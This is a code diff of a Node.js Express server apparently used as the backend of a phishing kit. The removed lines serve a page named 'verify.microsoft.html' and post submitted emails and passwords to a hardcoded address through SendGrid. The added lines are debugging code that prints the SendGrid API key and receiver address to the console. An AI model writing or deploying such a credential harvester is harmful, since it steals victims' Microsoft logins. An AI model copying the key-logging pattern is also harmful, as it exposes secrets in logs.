@@ -1,86 +1,54 @@
-const SENDGRID_API_KEY = 'SG.xxxxxxx'; // hardcode your key
-const RECEIVER_EMAIL = 'gil@gorgcef.org';
-sgMail.setApiKey(SENDGRID_API_KEY);
 const express = require('express');
-const bodyParser = require('body-parser');
 const sgMail = require('@sendgrid/mail');
-const path = require('path');
 
 const app = express();
 const port = 3000;
 
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
-
-// ===== DEBUG: Check what Railway passes =====
-console.log('=== Environment Variables ===');
-console.log('Keys available in process.env:', Object.keys(process.env));
-
-// Retrieve env vars
-const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
-const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;
-
-// Configure SendGrid only if key exists
-if (SENDGRID_API_KEY && RECEIVER_EMAIL) {
-  sgMail.setApiKey(SENDGRID_API_KEY);
-  console.log('✅ SendGrid is configured.');
-} else {
-  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will NOT be sent.');
+// Helper to visualize invisible characters
+function showChars(str) {
+  if (!str) return 'undefined';
+  return str.split('').map(c => {
+    const code = c.charCodeAt(0);
+    if (code === 32) return '[space]';
+    if (code === 10) return '[LF]';
+    if (code === 13) return '[CR]';
+    return c;
+  }).join('');
 }
 
-// ===== Routes =====
+// Inspect environment variables
+console.log('=== Environment Variables Inspection ===');
+console.log('SENDGRID_API_KEY:', showChars(process.env.SENDGRID_API_KEY));
+console.log('RECEIVER_EMAIL:', showChars(process.env.RECEIVER_EMAIL));
 
-// Home page
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
-});
+// Attempt to configure SendGrid only if variables appear correct
+if (process.env.SENDGRID_API_KEY && process.env.RECEIVER_EMAIL) {
+  sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+  console.log('✅ SendGrid configured.');
+} else {
+  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing or invalid. Emails will not be sent.');
+}
 
-// Form submission
-app.post('/submit', async (req, res) => {
-  const { email, password } = req.body;
-
-  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
-    console.warn('⚠️ Cannot send email: Missing env vars.');
-    return res.status(500).send('Server not configured to send emails.');
-  }
-
-  const msg = {
-    to: RECEIVER_EMAIL,
-    from: RECEIVER_EMAIL,
-    subject: 'New Login Submission',
-    text: `Email: ${email}\nPassword: ${password}`,
-  };
-
-  try {
-    await sgMail.send(msg);
-    res.send('✅ Form submitted. Email sent!');
-  } catch (error) {
-    console.error('SendGrid error:', error);
-    res.status(500).send('❌ Error sending email.');
-  }
-});
-
-// Test route to verify SendGrid
+// Simple test route
 app.get('/test', async (req, res) => {
-  if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
-    return res.send('⚠️ Env vars missing. Cannot send test email.');
+  if (!process.env.SENDGRID_API_KEY || !process.env.RECEIVER_EMAIL) {
+    return res.send('⚠️ Cannot send test email: Env vars missing or invalid.');
   }
 
   try {
     await sgMail.send({
-      to: RECEIVER_EMAIL,
-      from: RECEIVER_EMAIL,
-      subject: 'Test Email from Railway',
-      text: 'This is a test email to verify environment variables.',
+      to: process.env.RECEIVER_EMAIL,
+      from: process.env.RECEIVER_EMAIL,
+      subject: 'Railway Env Var Test',
+      text: 'This is a test email to confirm environment variables.',
     });
     res.send('✅ Test email sent!');
-  } catch (error) {
-    console.error('SendGrid test error:', error);
+  } catch (err) {
+    console.error('SendGrid error:', err);
     res.send('❌ Test email failed. Check logs.');
   }
 });
 
-// Start server
 app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
 });
